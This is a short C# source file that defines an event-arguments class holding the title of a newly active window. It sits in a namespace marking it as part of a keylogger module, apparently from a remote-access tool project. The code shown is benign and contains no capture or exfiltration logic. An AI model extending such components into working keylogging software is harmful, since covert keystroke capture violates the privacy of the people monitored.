using System;

namespace Orcus.Utilities.KeyLogger
{
    internal class ActiveWindowChangedEventArgs : EventArgs
    {
        public ActiveWindowChangedEventArgs(string title)
        {
            Title = title;
        }

        public string Title { get; }
    }
}